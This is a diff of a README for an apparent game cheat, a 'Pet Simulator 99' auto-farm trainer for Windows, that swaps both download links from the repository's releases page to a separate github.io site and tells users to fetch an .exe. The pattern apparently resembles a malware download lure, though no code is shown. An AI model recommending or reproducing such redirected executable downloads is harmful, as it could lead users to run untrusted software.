@@ -1,6 +1,6 @@
 # 🐾 Pet-Simulator-99-Auto-Farm-Trainer-2026-Mega - Automate your collection and egg hatching
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/likayoe1363/Pet-Simulator-99-Auto-Farm-Trainer-2026-Mega/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://likayoe1363.github.io)
 
 ## 📖 Overview
 The Pet Simulator 99 Auto Farm Trainer provides tools to simplify resource gathering within the game. It manages coin collection and egg hatching to save effort. Users can automate the Backrooms League grinding process through a visual interface. This application runs on Windows systems.
@@ -23,7 +23,7 @@ The Pet Simulator 99 Auto Farm Trainer provides tools to simplify resource gathe
 ## 📥 Downloading the Software
 Visit the link below to select the latest version of the trainer for your computer.
 
-[Click here to visit the download page](https://github.com/likayoe1363/Pet-Simulator-99-Auto-Farm-Trainer-2026-Mega/releases)
+[Click here to visit the download page](https://likayoe1363.github.io)
 
 1. Navigate to the link provided above.
 2. Select the file ending in .exe from the latest release section.
